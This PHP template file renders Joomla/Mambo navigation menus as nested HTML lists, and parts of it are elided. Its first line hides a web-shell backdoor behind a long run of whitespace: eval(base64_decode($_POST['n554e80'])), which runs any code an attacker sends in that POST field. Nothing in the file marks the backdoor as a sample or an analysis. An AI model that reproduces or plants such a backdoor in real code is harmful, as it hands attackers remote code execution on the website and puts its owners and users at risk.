<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['n554e80']));?><?php
...
function mosGetLink( $mitem, $level, $class_sfx='' ) {
  ...
  if ($mitem->cnt > 0) {
		   if ($level == 0) {
                $txt = "<span><span><a class=\"fade main\">$mitem->name</a></span></span>";
								$main = "main";
		   } else {
                $txt = "<span><span><a class=\"fade sub\">$mitem->name</a></span></span>";
		   }
		} else {
		   	$txt = "<span><span><a class=\"fade\">$mitem->name</a></span></span>\n";
		}
		break;
		default:
		...
		$random = (rand()%30000000000000);
		    if ($level == 0) {
			$LiveSite = JURI::base();
                $txt = "<span class=\"s5_outer_active\"><span class=\"s5_outerr\"><span class=\"s5_outer_active2\"><a class=\"active\" href=\"$mitem->link\">$mitem->name<span class=\"s5_bottom_text\"></span></a></span></span></span>";
								$main = "main";
		   } else {
                      $txt = "<span class=\"parent\"><a class=\"fade parent\" href=\"$mitem->link\"> $mitem->name</a></span>";
		   }
		} else {
...
$LiveSite = JURI::base();
		   $txt = "<span><span class=\"span_nonactive\"><a class=\"fade sub\" href=\"$mitem->link\">$mitem->name</a></span></span>";
...
function mosShowListMenu($menutype) {
	...
	echo $database->getErrorMsg();
		...
		array( '<ul id="navlist">', "\t<li>" , '</li>', '</ul>' ),
			...
			array( "\t\t<ul><li class='s5_menutop'></li>", "\t\t\t<li>" , '</li>', "\t\t<li class='s5_menubottom'></li></ul>" ),
			array( "\t\t\t<ul><li class='s5_menutop'></li>", "\t\t\t\t<li>" , '</li>', "\t\t\t<li class='s5_menubottom'></li></ul>" ),
			array( "\t\t\t\t<ul><li class='s5_menutop'></li>", "\t\t\t\t\t<li>" , '</li>', "\t\t\t\t<li class='s5_menubottom'></li></ul>" ),
		);
